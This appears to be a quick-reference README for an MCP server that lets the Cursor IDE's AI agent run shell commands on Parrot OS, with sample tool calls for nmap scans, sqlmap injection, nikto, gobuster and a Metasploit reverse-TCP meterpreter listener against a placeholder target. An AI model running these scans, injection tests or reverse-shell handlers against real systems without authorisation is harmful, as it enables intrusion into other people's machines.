# 🚀 Cursor MCP Quick Reference - Parrot OS

## 📋 Basic Usage

### System Information
```
@get_system_info
```

### Run Commands
```
@run_command {"command": "your-shell-command"}
```

### File Operations
```
@read_file {"file_path": "/path/to/file"}
@write_file {"file_path": "/path/to/file", "content": "file content"}
@list_directory {"path": "/path/to/dir"}
```

## 🔒 Security Operations

### Network Scanning
```
@run_command {"command": "nmap -sS -sV target.com"}
@run_command {"command": "nmap -p 1-1000 -T4 target.com"}
```

### Web Application Testing
```
@run_command {"command": "sqlmap -u 'http://target.com/login' --dbs"}
@run_command {"command": "burpsuite &"}
```

### Vulnerability Assessment
```
@run_command {"command": "nikto -h target.com"}
@run_command {"command": "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt"}
```

### Metasploit Integration
```
@run_command {"command": "msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit'"}
```

## 📁 File Management

### Read Security Documentation
```
@read_file {"file_path": "/home/ben/Documents/parrot mcp/pentesting_guide.md"}
@read_file {"file_path": "/home/ben/Documents/parrot mcp/advanced_hacking_tools.md"}
```

### Create Security Scripts
```
@write_file {
  "file_path": "/tmp/scan.sh",
  "content": "#!/bin/bash\necho 'Starting security scan...'\nnmap -sS $1\necho 'Scan complete!'"
}
```

### Backup Operations
```
@copy_file {"source": "/important/file.conf", "destination": "/backup/file.conf.bak"}
```

## 🛠️ System Administration

### Process Management
```
@run_command {"command": "ps aux | grep -i security"}
@run_command {"command": "systemctl status ssh"}
```

### Package Management
```
@run_command {"command": "apt update && apt upgrade -y"}
@run_command {"command": "apt search security-tool"}
```

### Log Analysis
```
@run_command {"command": "tail -f /var/log/auth.log"}
@run_command {"command": "grep 'Failed' /var/log/auth.log"}
```

## 🎯 Advanced Examples

### Multi-step Security Assessment
```
# Step 1: Reconnaissance
@run_command {"command": "nmap -sS -sV -O target.com -oA scan_results"}

# Step 2: Web Directory Brute-forcing
@run_command {"command": "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -o web_scan.txt"}

# Step 3: Read Results
@read_file {"file_path": "scan_results.nmap"}
@read_file {"file_path": "web_scan.txt"}
```

### Automated Reporting
```
@write_file {
  "file_path": "/tmp/security_report.md",
  "content": "# Security Assessment Report\n\n## Scan Results\n- Target: target.com\n- Date: $(date)\n\n## Findings\n$(cat scan_results.nmap | head -20)\n\n## Recommendations\n- Update services\n- Review firewall rules"
}
```

## 🔧 Troubleshooting

### Check MCP Status
```
@run_command {"command": "cd /home/ben/Documents/parrot mcp && source .venv/bin/activate && python test_server.py"}
```

### Verify Installation
```
@run_command {"command": "which nmap sqlmap msfconsole burpsuite"}
```

### Test Connectivity
```
@run_command {"command": "ping -c 4 google.com"}
@run_command {"command": "curl -I http://target.com"}
```

## 📊 Performance Tips

- Use `@run_command` for quick shell operations
- Use `@read_file` for reading documentation and results
- Use `@write_file` for creating scripts and reports
- Chain commands for complex workflows

## 🚀 Ready to Use!

Your Parrot OS MCP server is fully integrated with Cursor IDE. Use `@` commands to access powerful security tools directly from your editor!